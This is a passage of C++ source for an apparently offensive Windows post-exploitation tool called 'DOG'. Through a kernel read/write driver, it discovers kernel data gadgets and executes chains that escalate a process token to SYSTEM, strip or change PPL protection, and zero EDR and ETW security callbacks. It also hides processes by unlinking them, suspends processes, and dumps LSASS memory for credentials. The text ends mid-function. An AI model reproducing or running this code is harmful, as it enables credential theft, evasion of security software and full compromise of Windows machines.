#define NOMINMAX
#include <Windows.h>
#include <iostream>
#include <iomanip>
#include <vector>
#include <map>
#include <string>
#include <memory>
#include <thread>
#include <chrono>
#include <algorithm>
#include <cstdlib>
#include <limits>
#include <sstream>
#include <set>
#include <optional>
#include <cstddef>
#include <cwctype>
#include <cstdio>
#include <cstring>
#include <random>
#include <vector>
#include <ntsecapi.h>
#include <DbgHelp.h>
#pragma comment(lib, "Dbghelp.lib")

// Verbosity toggles (keep output minimal by default)
constexpr bool kVerboseLsass = false;

// Minimal NT Native definitions (avoid winternl.h conflicts)
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#include "KernelReadWrite.h"
#include "BackendConfig.h"
#include "RwFactory.h"
#include "WindowsVersion.h"
#include "Offsets.h"
#include "GadgetDiscovery.h"
#include "GadgetChaining.h"

// ASCII Art Logo
void PrintLogo() {
    std::cout << R"(
+--------------------------------------------------+
|            "DOG" Data-Only Gadget tool           |
|               VBS/HVCI/kCET [Enabled]            |
|                                                  |
|   Author: Juan Sacco - https://exploitpack.com   |
|                    __                            |
|                 o-''|\_____/)                    |
|                  \_/|_)     )                    |
|                     \  __  /                     |
|                     (_/ (_/    ~VBS~             |
+--------------------------------------------------+
)" << std::endl;
}

#include "RawDumpConverter.h"
class ProcessMemoryReader {
public:
    virtual ~ProcessMemoryReader() = default;
    virtual bool ReadMemory(uint64_t virtualAddress, void* buffer, size_t size) = 0;
    virtual uint64_t GetDtlb() const = 0;
};

// Main application class
class DataOnlyGadgetTool {
private:
    std::unique_ptr<KernelReadWrite> rw;
    DriverConfig driverCfg{};
    bool patternScanEnabled = false;
    bool crossRefsEnabled = false;
    bool validationEnabled = false;
    std::unique_ptr<WindowsVersionDetector> versionDetector;
    std::unique_ptr<OffsetManager> offsetManager;
    std::unique_ptr<GadgetDiscoveryEngine> discovery;
    std::unique_ptr<GadgetChainingEngine> chaining;

    WindowsVersion currentVersion;
    std::map<uint64_t, DataGadget> discoveredGadgets;
    std::string restartCmdLine;

    bool ReadUserVAWithDTB(KernelReadWrite* phys, uint64_t dtb, uint64_t va, void* buffer, size_t size);
    bool WriteUserVAWithDTB(KernelReadWrite* phys, uint64_t dtb, uint64_t va, const void* buffer, size_t size);
    bool DumpLsass(bool useMinidump = false);
    bool PatchWDigest(KernelReadWrite* phys, uint64_t dtb, uint64_t peb);
    bool SuspendProcess(uint32_t pid);
    bool FullReload();
    bool HardRestart();
public:
    explicit DataOnlyGadgetTool(std::unique_ptr<KernelReadWrite> rw_in,
                                const DriverConfig& cfg,
                                bool patternScan,
                                bool crossRefs,
                                bool validation,
                                const std::string& restartLine) {
        rw = std::move(rw_in);
        driverCfg = cfg;
        patternScanEnabled = patternScan;
        crossRefsEnabled = crossRefs;
        validationEnabled = validation;
        restartCmdLine = restartLine;
        if (!rw || !rw->IsDriverAvailable()) {
            std::cerr << "[!] No kernel R/W driver available. Exiting." << std::endl;
            std::exit(1);
        }
        
        // Initialize components
        versionDetector = std::make_unique<WindowsVersionDetector>();
        offsetManager = std::make_unique<OffsetManager>();
        discovery = std::make_unique<GadgetDiscoveryEngine>(rw.get());
        chaining = std::make_unique<GadgetChainingEngine>(rw.get());

        currentVersion = versionDetector->GetCurrentVersion();

        // Apply discovery configuration passed from CLI
        ConfigureDiscovery(patternScanEnabled, crossRefsEnabled, validationEnabled);
    }
    
    void PrintSystemInfo() {
        std::cout << "[*] System Information:" << std::endl;
        std::cout << "    Windows: " << versionDetector->GetVersionName() << std::endl;
        std::cout << "    Build:   " << currentVersion.build << std::endl;
        if (currentVersion.fileBuild) {
            std::cout << "    NT File Build: " << currentVersion.fileBuild << std::endl;
        }
        std::cout << "    Edition: " << currentVersion.edition << std::endl;
        std::cout << "    Arch:    x64" << std::endl;
        
        std::cout << "    R/W:     Driver available" << std::endl;
        std::cout << std::endl;
    }
    
    void RunFullDiscovery() {
        std::cout << "[*] Starting full gadget discovery..." << std::endl;
        auto startTime = GetTickCount64();
        
        discoveredGadgets.clear();
        auto gadgets = discovery->DiscoverAllGadgets();
        
        // Store in map
        for (auto& g : gadgets) {
            discoveredGadgets[g.address] = g;
        }
        
        auto endTime = GetTickCount64();
        auto elapsed = (endTime - startTime) / 1000;
        
        std::cout << std::endl;
        std::cout << "[+] Discovery completed in " << elapsed << " seconds" << std::endl;
        
        // Update chaining engine
        chaining->SetAvailableGadgets(discoveredGadgets);
        
        PrintStatistics();
    }

    void ConfigureDiscovery(bool patternScan, bool crossRefs, bool validation) {
        discovery->EnablePatternScan(patternScan);
        discovery->EnableCrossReferences(crossRefs);
        discovery->EnableDynamicValidation(validation);
    }
    bool ConvertRawToMinidump(const std::string& inPath, const std::string& outPath);
    
    void PrintStatistics() {
        std::map<GadgetType, int> typeCounts;
        int writable = 0;
        int highConfidence = 0;
        
        for (auto& [addr, gadget] : discoveredGadgets) {
            typeCounts[gadget.type]++;
            if (gadget.is_writable) writable++;
            if (gadget.confidence_score >= 80) highConfidence++;
        }
        
        std::cout << std::endl;
        std::cout << std::endl;
        std::cout << "+--------------------------------------------------------------+" << std::endl;
        std::cout << "|                    DISCOVERY STATISTICS                      |" << std::endl;
        std::cout << "+--------------------------------------------------------------+" << std::endl;
        std::cout << " Total gadgets:      " << std::setw(34) << discoveredGadgets.size() << " " << std::endl;
        std::cout << " Writable:            " << std::setw(34) << writable << " " << std::endl;
        std::cout << " High confidence:     " << std::setw(34) << highConfidence << " " << std::endl;
        std::cout << " Gadget types:        " << std::setw(34) << typeCounts.size() << " " << std::endl;
        std::cout << "+--------------------------------------------------------------+" << std::endl;
        
        std::cout << std::endl;
        std::cout << "Top gadget types:" << std::endl;
        
        // Convert to vector for sorting
        std::vector<std::pair<GadgetType, int>> sortedTypes(typeCounts.begin(), typeCounts.end());
        std::sort(sortedTypes.begin(), sortedTypes.end(),
                  [](auto& a, auto& b) { return a.second > b.second; });
        
        for (int i = 0; i < std::min(10, (int)sortedTypes.size()); i++) {
            auto& [type, count] = sortedTypes[i];
            std::string typeName = GetGadgetTypeName(type);
            std::cout << "  " << std::setw(30) << typeName << ": " << count << std::endl;
        }
        // Debug preview: first few token gadgets to aid chaining
        int shown = 0;
        for (auto& [addr, gadget] : discoveredGadgets) {
            if (gadget.type == GadgetType::TOKEN_FIELD && shown < 5) {
        //        std::cout << "    [token] pid=" << gadget.process_id
        //                  << " owner=" << gadget.owner_process
        //                  << " addr=0x" << std::hex << gadget.address
        //                  << " val=0x" << gadget.original_value
        //                  << " raw=0x" << rw->ReadPointer(gadget.address)
        //                  << std::dec << std::endl;
                shown++;
            }
            if (shown >= 5) break;
        }
        std::cout << std::endl;
    }
    
    void ShowChains() {
        std::cout << "[*] Building exploit chains..." << std::endl;
        
        auto chains = chaining->FindAllPossibleChains();
        
        std::cout << std::endl;
        std::cout << std::endl;
        std::cout << "+--------------------------------------------------------------+" << std::endl;
        std::cout << "|                  AVAILABLE EXPLOIT CHAINS                    |" << std::endl;
        std::cout << "+--------------------------------------------------------------+" << std::endl;
        
        for (auto& chain : chains) {
            std::string status = chain.IsValid() ? 
                "[OK] " + std::to_string(chain.Size()) + " gadgets" : 
                "[--] Not available";
            
            std::cout << " " << std::setw(30) << chain.goal_name << ": " 
                      << std::setw(22) << status << " " << std::endl;
        }

        // LSASS dump availability (handled outside chaining engine)
        int lsassCount = 0;
        for (auto& [addr, g] : discoveredGadgets) {
            if (g.type == GadgetType::TOKEN_FIELD) {
                std::string owner = g.owner_process;
                std::transform(owner.begin(), owner.end(), owner.begin(), ::tolower);
                if (owner.find("lsass") != std::string::npos) {
                    lsassCount++;
                    break;
                }
            }
        }
        bool physBackend = rw->SupportsPhysical();
        std::string lsassStatus;
        if (physBackend && lsassCount)  lsassStatus = "[OK] " + std::to_string(lsassCount) + " gadgets";
        else if (!physBackend)          lsassStatus = "[--] needs physical-capable backend";
        else                            lsassStatus = "[--] 0 gadgets";
        std::cout << " " << std::setw(30) << "lsass dump" << ": "
                  << std::setw(22) << lsassStatus << " " << std::endl;
        
        std::cout << "+--------------------------------------------------------------+" << std::endl;
        std::cout << std::endl;
    }
    
    bool ExecuteChain(const std::string& chainName) {
        ExploitGoal goal;
        uint32_t unlinkPid = 0;
        uint32_t privPid = 0;
        
        if (chainName == "priv" || chainName == "privilege") {
            goal = ExploitGoal::PRIVILEGE_ESCALATION;
        } else if (chainName == "ppl") {
            goal = ExploitGoal::BYPASS_PPL;
        } else if (chainName == "security" || chainName == "disable") {
            goal = ExploitGoal::DISABLE_SECURITY;
        } else if (chainName == "read") {
            goal = ExploitGoal::ARBITRARY_READ;
        } else if (chainName == "write") {
            goal = ExploitGoal::ARBITRARY_WRITE;
        } else if (chainName == "code" || chainName == "redirect") {
            goal = ExploitGoal::CODE_EXECUTION_REDIRECT;
        } else if (chainName == "unlink") {
            goal = ExploitGoal::UNLINK_PROCESS;
        } else if (chainName == "suspend") {
            std::cout << "[?] What PID do you want to suspend? " << std::endl;
            uint32_t pid = 0;
            std::cin >> pid;
            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
            return SuspendProcess(pid);
        } else if (chainName == "lsass") {
            // handled directly (dump)
            return DumpLsass(false);
        } else if (chainName == "lsassmd") {
            return DumpLsass(true);
        } else {
            std::cout << "[!] Unknown chain: " << chainName << std::endl;
            return false;
        }
        
        GadgetChain chain;
        if (goal == ExploitGoal::BYPASS_PPL) {
            std::cout << "[?] What PID number you want to use? " << std::endl;
            uint32_t pidInput = 0;
            std::cin >> pidInput;
            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');

            std::cout << "[?] Select the new PPL level for this process:" << std::endl;
            std::cout << "1) PROTECTION_LEVEL_WINTCB_LIGHT" << std::endl;
            std::cout << "2) PROTECTION_LEVEL_WINDOWS" << std::endl;
            std::cout << "3) PROTECTION_LEVEL_WINDOWS_LIGHT" << std::endl;
            std::cout << "4) PROTECTION_LEVEL_ANTIMALWARE_LIGHT" << std::endl;
            std::cout << "5) PROTECTION_LEVEL_LSA_LIGHT" << std::endl;
            std::cout << "6) PROTECTION_LEVEL_WINTCB" << std::endl;
            std::cout << "7) PROTECTION_LEVEL_CODEGEN_LIGHT" << std::endl;
            std::cout << "8) PROTECTION_LEVEL_AUTHENTICODE" << std::endl;
            std::cout << "9) PROTECTION_LEVEL_PPL_APP" << std::endl;
            std::cout << "0) PROTECTION_LEVEL_NONE" << std::endl;
            std::cout << "> ";
            std::string sel;
            std::getline(std::cin, sel);
            uint8_t protVal = 0;
            if (!sel.empty()) {
                switch (sel[0]) {
                case '1': protVal = 0x61; break; // WINTCB_LIGHT (Signer=WinTcb, Type=ProtectedLight)
                case '2': protVal = 0x52; break; // WINDOWS (Signer=Windows, Type=Protected)
                case '3': protVal = 0x51; break; // WINDOWS_LIGHT (Signer=Windows, Type=ProtectedLight)
                case '4': protVal = 0x31; break; // ANTIMALWARE_LIGHT (Signer=Antimalware, Type=ProtectedLight)
                case '5': protVal = 0x41; break; // LSA_LIGHT (Signer=Lsa, Type=ProtectedLight)
                case '6': protVal = 0x62; break; // WINTCB (Signer=WinTcb, Type=Protected)
                case '7': protVal = 0x21; break; // CODEGEN_LIGHT (Signer=CodeGen, Type=ProtectedLight)
                case '8': protVal = 0x12; break; // AUTHENTICODE (Signer=Authenticode, Type=Protected)
                case '9': protVal = 0x81; break; // PPL_APP (Signer=App, Type=ProtectedLight)
                case '0': default: protVal = 0x00; break; // NONE
                }
            }
            chain = chaining->FindPPLBypassChain(pidInput, protVal);
        } else if (goal == ExploitGoal::PRIVILEGE_ESCALATION) {
            std::cout << "[?] What PID should be elevated? (blank = self) " << std::endl;
            std::string line;
            std::getline(std::cin, line);
            if (line.empty()) {
                privPid = GetCurrentProcessId();
            } else {
                privPid = static_cast<uint32_t>(std::strtoul(line.c_str(), nullptr, 0));
            }
            chain = chaining->FindPrivilegeEscalationChain(privPid);
        } else if (goal == ExploitGoal::UNLINK_PROCESS) {
            std::cout << "[?] What PID should be unlinked? " << std::endl;
            std::cin >> unlinkPid;
            chain = chaining->FindUnlinkProcessChain(unlinkPid);
            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
        } else if (goal == ExploitGoal::DISABLE_SECURITY) {
            // Build simple categories from discovered gadgets
            struct Cat {
                std::string name;
                bool documented;
                std::vector<uint64_t> addrs;
            };
            std::vector<Cat> cats;
            auto ensure = [&](const std::string& name, bool doc) -> Cat& {
                for (auto& c : cats) if (c.name == name) return c;
                cats.push_back({name, doc, {}});
                return cats.back();
            };

            for (auto& [addr, gadget] : discoveredGadgets) {
                if (!gadget.is_writable) continue;
                switch (gadget.type) {
                case GadgetType::PROCESS_CALLBACK:
                case GadgetType::THREAD_CALLBACK:
                case GadgetType::IMAGE_CALLBACK:
                    ensure("Process/Thread/Image", false).addrs.push_back(addr);
                    break;
                case GadgetType::MINIFILTER_CALLBACK:
                    ensure("Minifilter", true).addrs.push_back(addr);
                    break;
                case GadgetType::ETW_CALLBACK:
                    ensure("ETW/TI", false).addrs.push_back(addr);
                    break;
                case GadgetType::BUGCHECK_CALLBACK:
                case GadgetType::SHUTDOWN_CALLBACK:
                    ensure("Bugcheck/Shutdown", true).addrs.push_back(addr);
                    break;
                default:
                    break;
                }
            }

            if (cats.empty()) {
                std::cout << "[!] No writable security callbacks found" << std::endl;
                return false;
            }

            // Brief summary per category
            std::cout << "[*] Callback groups summary:" << std::endl;
            for (auto& c : cats) {
                std::string desc;
                if (c.name == "Process/Thread/Image")       desc = "Ps* notify routines and arrays (Psp*)";
                else if (c.name == "Minifilter")            desc = "FltRegisterFilter callbacks";
                else if (c.name == "ETW/TI")                desc = "EtwTiLogReadWriteVm consumer callbacks";
                else                                        desc = "Bugcheck/Shutdown notifications";

                std::cout << "    - " << c.name << ": " << desc
                          << " | " << c.addrs.size() << " entries | "
                          << (c.documented ? "documented" : "undocumented")
                          << std::endl;
            }
            std::cout << std::endl;

            std::cout << "[?] Choose the callback group to disable (0 = cancel):" << std::endl;
            for (size_t i = 0; i < cats.size(); ++i) {
                std::cout << "  " << (i + 1) << ") " << cats[i].name
                          << " [" << cats[i].addrs.size() << "] "
                          << (cats[i].documented ? "(documented)" : "(undocumented)") << std::endl;
            }
            size_t all_no_symbol_idx = cats.size() + 1;
            size_t all_idx = cats.size() + 2;
            std::cout << "  " << all_no_symbol_idx << ") All besides symbol-based" << std::endl;
            std::cout << "  " << all_idx << ") All groups" << std::endl;

            size_t choice = 0;
            std::cin >> choice;
            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
            if (choice == 0) {
                std::cout << "[*] Cancelled." << std::endl;
                return false;
            }
            if (choice > all_idx) {
                std::cout << "[!] Invalid choice" << std::endl;
                return false;
            }

            std::vector<uint64_t> targets;
            auto is_symbol = [&](uint64_t addr) -> bool {
                auto it = discoveredGadgets.find(addr);
                if (it == discoveredGadgets.end()) return false;
                const auto& g = it->second;
                return (!g.name.empty() && g.name.rfind("Symbol_", 0) == 0) ||
                       (!g.type_name.empty() && g.type_name.rfind("Symbol_", 0) == 0);
            };

            if (choice == all_idx) {
                for (auto& c : cats) targets.insert(targets.end(), c.addrs.begin(), c.addrs.end());
            } else if (choice == all_no_symbol_idx) {
                for (auto& c : cats) {
                    for (auto a : c.addrs) {
                        if (!is_symbol(a)) targets.push_back(a);
                    }
                }
            } else {
                targets = cats[choice - 1].addrs;
            }
            if (targets.empty()) {
                std::cout << "[!] No callbacks in selected group" << std::endl;
                return false;
            }

            chain.goal = ExploitGoal::DISABLE_SECURITY;
            chain.goal_name = "disable security";
            chain.description = "Disable " + std::to_string(targets.size()) + " callbacks";
            chain.gadget_addresses = targets;
            for (auto a : targets) {
                auto it = discoveredGadgets.find(a);
                uint64_t orig = (it != discoveredGadgets.end()) ? it->second.original_value : 0;
                chain.original_values[a] = orig;
                chain.new_values[a] = 0;
            }
        } else if (goal == ExploitGoal::PERSISTENCE && chainName == "lsass") {
            // Inline LSASS info/dump stub
            DumpLsassInfo();
            return true;
        } else {
            chain = chaining->FindChainForGoal(goal);
        }
        
        if (!chain.IsValid()) {
            std::cout << "[!] No suitable chain found for " << chainName << std::endl;
            return false;
        }
        
        std::cout << "[*] Found chain: " << chain.description << std::endl;
        chaining->PrintChain(chain);
        
        std::cout << "[?] Execute this chain? (y/n): ";
        char response;
        std::cin >> response;
        
        if (response == 'y' || response == 'Y') {
            bool success = chaining->ExecuteChain(chain);
            
            if (success) {
                std::cout << "[+] Chain executed successfully!" << std::endl;
                
                // Verify privilege escalation
        if (goal == ExploitGoal::PRIVILEGE_ESCALATION || 
            goal == ExploitGoal::TOKEN_STEALING) {
            DWORD pid = (goal == ExploitGoal::PRIVILEGE_ESCALATION && privPid) ? privPid : GetCurrentProcessId();
            uint64_t tgtTok = 0, sysTok = 0;
            bool match = chaining->VerifyTokenMatchesSystem(pid, tgtTok, sysTok);
            std::cout << "[*] Token check for PID " << pid << ": target=0x" << std::hex << tgtTok
                      << " system=0x" << sysTok << " => " << (match ? "MATCH" : "DIFFER") << std::dec << std::endl;
        } else if (goal == ExploitGoal::UNLINK_PROCESS) {
            if (unlinkPid == 0) unlinkPid = GetCurrentProcessId();
            std::stringstream cmd;
            cmd << "tasklist /FI \"PID eq " << unlinkPid << "\"";
            FILE* pipe = _popen(cmd.str().c_str(), "r");
            bool found = false;
            std::string line;
            if (pipe) {
                char buf[256];
                while (fgets(buf, sizeof(buf), pipe)) {
                    line = buf;
                    if (line.find("No tasks") == std::string::npos &&
                        line.find("INFO: No tasks") == std::string::npos &&
                        line.find("==========") == std::string::npos &&
                        line.find("Image Name") == std::string::npos) {
                        found = true;
                        break;
                    }
                }
                _pclose(pipe);
            }
            std::cout << "[*] tasklist check for PID " << unlinkPid << ": "
                      << (found ? "still listed (unlink may have failed)" : "not listed (unlinked/hidden)")
                      << std::endl;
        }
            } else {
                std::cout << "[!] Chain execution failed!" << std::endl;
            }
            
            std::cout << "[?] Restore original values? (y/n): ";
            std::cin >> response;
            
            if (response == 'y' || response == 'Y') {
                chaining->RestoreChain(chain);
            }
            
            return success;
        }
        
        return false;
    }

    // LSASS info/dump stub using current discovery data and kernel R/W
    void DumpLsassInfo() {
        // Find LSASS process gadgets
        uint32_t lsassPid = 0;
        uint64_t lsassEproc = 0;
        uint64_t lsassProt = 0;
        uint64_t lsassToken = 0;
        for (auto& [addr, g] : discoveredGadgets) {
            if (g.type == GadgetType::TOKEN_FIELD && g.owner_process.find("lsass.exe") != std::string::npos) {
                lsassPid = g.process_id;
                lsassToken = rw->ReadPointer(g.address) & ~0xFULL;
                lsassEproc = g.structure_base;
            }
            if (g.type == GadgetType::PROCESS_FLAGS && g.type_name == "PROCESS_PROTECTION" &&
                g.owner_process.find("lsass.exe") != std::string::npos) {
                lsassProt = rw->ReadUint8(g.address);
            }
        }
        if (!lsassPid) {
            std::cout << "[!] LSASS not found in current discovery. Run 'discover' and retry." << std::endl;
            return;
        }
        std::cout << "[+] LSASS PID: " << lsassPid << std::endl;
        if (lsassEproc) std::cout << "[+] LSASS _EPROCESS: 0x" << std::hex << lsassEproc << std::dec << std::endl;
        if (lsassToken) std::cout << "[+] LSASS token: 0x" << std::hex << lsassToken << std::dec << std::endl;
        std::cout << "[+] LSASS Protection: 0x" << std::hex << lsassProt << std::dec << std::endl;
        std::cout << "[*] Use --pattern-scan/--xrefs if you need more primitives for dumping." << std::endl;
    }

    
    void ExportGadgets(const std::string& filename) {
        if (discovery->ExportToJson(filename)) {
            std::cout << "[+] Exported " << discoveredGadgets.size() 
                      << " gadgets to " << filename << std::endl;
        } else {
            std::cout << "[!] Failed to export to " << filename << std::endl;
        }
    }
    
    void ListGadgets(int minScore = 50) {
        std::cout << "[*] Gadgets with confidence >= " << minScore << ":" << std::endl;
        
        int count = 0;
        for (auto& [addr, gadget] : discoveredGadgets) {
            if (gadget.confidence_score >= minScore) {
                std::cout << "  " << gadget.ToString() << std::endl;
                count++;
                if (count >= 20) {
                    std::cout << "  ... and " << (discoveredGadgets.size() - count) 
                              << " more" << std::endl;
                    break;
                }
            }
        }
    }
    
    void InteractiveMenu() {
        std::string command;
        
        while (true) {
            std::cout << std::endl << ">> ";
            std::getline(std::cin, command);
            
            if (command == "quit" || command == "exit") {
                break;
            }
            else if (command == "discover" || command == "scan") {
                RunFullDiscovery();
            }
            else if (command == "chains") {
                ShowChains();
            }
            else if (command == "stats") {
                PrintStatistics();
            }
            else if (command == "list") {
                ListGadgets();
            }
            else if (command.find("exec ") == 0) {
                std::string chainName = command.substr(5);
                ExecuteChain(chainName);
            }
            else if (command.find("lsass") == 0) {
                ExecuteChain("lsass");
            }
            else if (command.rfind("raw2dmp", 0) == 0) {
                std::string args = command.substr(7);
                std::string in, out;
                if (!args.empty()) {
                    std::istringstream ss(args);
                    ss >> in >> out;
                }
                ConvertRawToMinidump(in, out);
            }
            else if (command.find("export ") == 0) {
                std::string filename = command.substr(7);
                ExportGadgets(filename);
            }
            else if (command == "reload") {
                std::cout << "[*] Restarting tool..." << std::endl;
                if (!HardRestart()) {
                    std::cout << "[!] Restart failed." << std::endl;
                }
            }
            else if (command == "info") {
                PrintSystemInfo();
            }
            else if (command == "help") {
                PrintHelp();
            }
            else if (!command.empty()) {
                std::cout << "Unknown command. Type 'help' for options." << std::endl;
            }
        }
    }
    
    void PrintHelp() {
        std::cout << std::endl;
        std::cout << "Available commands:" << std::endl;
        std::cout << "  discover           - Run full gadget discovery" << std::endl;
        std::cout << "  chains             - Show available exploit chains" << std::endl;
        std::cout << "  exec <chain>       - Execute chain (priv, ppl, security, read, write, code, unlink, lsass, suspend)" << std::endl;
        std::cout << "  raw2dmp            - Convert lsass_dtb.raw to a minidump" << std::endl;
        std::cout << "  list               - List discovered gadgets" << std::endl;
        std::cout << "  stats              - Show discovery statistics" << std::endl;
        std::cout << "  export <filename>  - Export gadgets to JSON" << std::endl;
        std::cout << "  reload             - Fully reload driver + discovery state" << std::endl;
        std::cout << "  info               - Show system information" << std::endl;
       // std::cout << "Flags: --pattern-scan (enable Stage 6), --xrefs (enable Stage 7), --validate (enable Stage 8)" << std::endl;
        std::cout << "  help               - Show this help" << std::endl;
        std::cout << "  quit               - Exit" << std::endl;
        std::cout << std::endl;
    }

static std::string GetGadgetTypeName(GadgetType type) {
        switch (type) {
            case GadgetType::TOKEN_FIELD: return "TOKEN_FIELD";
            case GadgetType::TOKEN_PRIVILEGES: return "TOKEN_PRIVILEGES";
            case GadgetType::HANDLE_TABLE_ENTRY_ACCESS: return "HANDLE_ACCESS";
            case GadgetType::PROCESS_CALLBACK: return "PROCESS_CALLBACK";
            case GadgetType::THREAD_CALLBACK: return "THREAD_CALLBACK";
            case GadgetType::IMAGE_CALLBACK: return "IMAGE_CALLBACK";
            case GadgetType::MINIFILTER_CALLBACK: return "MINIFILTER_CALLBACK";
            case GadgetType::ETW_CALLBACK: return "ETW_CALLBACK";
            case GadgetType::OBJECT_TYPE_OPEN: return "OBJECT_OPEN";
            case GadgetType::OBJECT_TYPE_CLOSE: return "OBJECT_CLOSE";
            case GadgetType::OBJECT_TYPE_DELETE: return "OBJECT_DELETE";
            case GadgetType::OBJECT_TYPE_SECURITY: return "OBJECT_SECURITY";
            case GadgetType::GENERIC_FUNCTION_POINTER: return "FUNC_POINTER";
            case GadgetType::GENERIC_ACCESS_MASK: return "ACCESS_MASK";
            case GadgetType::GENERIC_FLAG_FIELD: return "FLAG_FIELD";
            case GadgetType::TIMER_DPC: return "TIMER_DPC";
            case GadgetType::DPC_ROUTINE: return "DPC_ROUTINE";
            case GadgetType::APC_KERNEL_ROUTINE: return "APC_KERNEL";
            case GadgetType::WORK_ITEM_ROUTINE: return "WORK_ITEM";
            case GadgetType::DRIVER_MAJOR_FUNCTION: return "DRIVER_MAJOR";
            default: return "UNKNOWN";
        }
    }
};

bool DataOnlyGadgetTool::FullReload() {
    std::cout << "[*] Reloading driver and discovery state..." << std::endl;

    // Drop current state so destructors unload the driver and reset mapping globals
    discoveredGadgets.clear();
    chaining.reset();
    discovery.reset();
    offsetManager.reset();
    versionDetector.reset();
    rw.reset();

    auto newRw = CreateKernelReadWrite(driverCfg);
    if (!newRw || !newRw->IsDriverAvailable()) {
        std::cout << "[!] Reload failed: unable to initialize kernel R/W driver." << std::endl;
        return false;
    }
    rw = std::move(newRw);

    versionDetector = std::make_unique<WindowsVersionDetector>();
    offsetManager = std::make_unique<OffsetManager>();
    discovery = std::make_unique<GadgetDiscoveryEngine>(rw.get());
    chaining = std::make_unique<GadgetChainingEngine>(rw.get());
    currentVersion = versionDetector->GetCurrentVersion();

    ConfigureDiscovery(patternScanEnabled, crossRefsEnabled, validationEnabled);
    RunFullDiscovery();
    return true;
}

bool DataOnlyGadgetTool::HardRestart() {
    if (restartCmdLine.empty()) return false;

    // Mutable command line buffer for CreateProcess
    std::vector<char> cmdBuf(restartCmdLine.begin(), restartCmdLine.end());
    cmdBuf.push_back('\0');

    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);
    si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
    si.hStdError  = GetStdHandle(STD_ERROR_HANDLE);
    PROCESS_INFORMATION pi{};

    BOOL ok = CreateProcessA(
        nullptr,
        cmdBuf.data(),
        nullptr, nullptr,
        TRUE,               // inherit console handles
        0,
        nullptr,
        nullptr,
        &si,
        &pi);

    if (!ok) {
        std::cout << "[!] CreateProcess failed: " << GetLastError() << std::endl;
        return false;
    }

    CloseHandle(pi.hThread);
    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    ExitProcess(exitCode); // never returns
    return true;
}

bool DataOnlyGadgetTool::ReadUserVAWithDTB(KernelReadWrite* phys, uint64_t dtb, uint64_t va, void* buffer, size_t size) {
    if (!phys || dtb == 0 || !buffer || size == 0) return false;
    if (!phys->SupportsPhysical()) return false;
    constexpr bool kVerbosePaging = false;
    uint64_t cr3 = dtb & ~0xFFFULL;
    // If DirBase looks like a virtual VA, translate it to PA
    uint64_t cr3Phys = phys->VirtToPhys(cr3);
    if (cr3Phys) cr3 = cr3Phys;
    uint8_t* out = static_cast<uint8_t*>(buffer);
    size_t done = 0;
    bool ok = true;

    constexpr uint64_t PFN_MASK = (1ULL << 40) - 1; // 40-bit PFN

    auto readEntry = [&](uint64_t pa, uint64_t& val) -> bool {
        if (!phys->ReadPhysical(pa, &val, sizeof(val))) {
            if (kVerbosePaging)
                std::cout << "[dbg] ReadPhysical failed @PA 0x" << std::hex << pa << std::dec << std::endl;
            return false;
        }
        return true;
    };

    while (done < size) {
        uint64_t cur = va + done;
        uint16_t pml4 = (cur >> 39) & 0x1FF;
        uint64_t pml4_pa = cr3 + (pml4 * 8);
        uint64_t e1 = 0;
            if (!readEntry(pml4_pa, e1)) return false;
            if (!(e1 & 1)) {
                if (kVerbosePaging)
                    std::cout << "[dbg] PML4 miss for VA 0x" << std::hex << cur << " entry 0x" << e1 << std::dec << std::endl;
                return false;
            }

            uint16_t pdpt = (cur >> 30) & 0x1FF;
            uint64_t pfn1 = (e1 >> 12) & PFN_MASK;
            uint64_t pdpt_pa = (pfn1 << 12) + (pdpt * 8);
            uint64_t e2 = 0;
            if (!readEntry(pdpt_pa, e2)) return false;
            if (!(e2 & 1)) {
                if (kVerbosePaging)
                    std::cout << "[dbg] PDPT miss VA 0x" << std::hex << cur << " entry 0x" << e2 << std::dec << std::endl;
                return false;
            }
            if (e2 & (1ULL << 7)) { // 1GB large page
                uint64_t pfn2 = (e2 >> 12) & PFN_MASK;
                uint64_t physAddr = (pfn2 << 12) + (cur & 0x3FFFFFFFULL);
                size_t chunk = std::min<size_t>(size - done, 0x40000000 - (cur & 0x3FFFFFFF));
                if (!phys->ReadPhysical(physAddr, out + done, chunk)) return false;
                done += chunk;
                continue;
            }

            uint16_t pd = (cur >> 21) & 0x1FF;
            uint64_t pfn2 = (e2 >> 12) & PFN_MASK;
            uint64_t pd_pa = (pfn2 << 12) + (pd * 8);
            uint64_t e3 = 0;
            if (!readEntry(pd_pa, e3)) return false;
            if (!(e3 & 1)) {
                if (kVerbosePaging)
                    std::cout << "[dbg] PD miss VA 0x" << std::hex << cur << " entry 0x" << e3 << std::dec << std::endl;
                return false;
            }
            if (e3 & (1ULL << 7)) { // 2MB large page
                uint64_t pfn3 = (e3 >> 12) & PFN_MASK;
                uint64_t physAddr = (pfn3 << 12) + (cur & 0x1FFFFFULL);
                size_t chunk = std::min<size_t>(size - done, 0x200000 - (cur & 0x1FFFFF));
                if (!phys->ReadPhysical(physAddr, out + done, chunk)) return false;
                done += chunk;
                continue;
            }

    uint16_t pt = (cur >> 12) & 0x1FF;
    uint64_t pfn3 = (e3 >> 12) & PFN_MASK;
    uint64_t pt_pa = (pfn3 << 12) + (pt * 8);
    uint64_t e4 = 0;
    if (!readEntry(pt_pa, e4)) return false;
    if (!(e4 & 1)) {
        if (kVerbosePaging)
            std::cout << "[dbg] PT miss VA 0x" << std::hex << cur << " entry 0x" << e4 << std::dec << std::endl;
        return false;
    }

    uint64_t pfn4 = (e4 >> 12) & PFN_MASK;
    uint64_t physAddr = (pfn4 << 12) + (cur & 0xFFF);
    size_t chunk = std::min<size_t>(size - done, 0x1000 - (cur & 0xFFF));
    if (!phys->ReadPhysical(physAddr, out + done, chunk)) {
        if (kVerbosePaging)
            std::cout << "[dbg] ReadPhysical failed final @PA 0x" << std::hex << physAddr << std::dec << std::endl;
        return false;
    }
    done += chunk;
    }
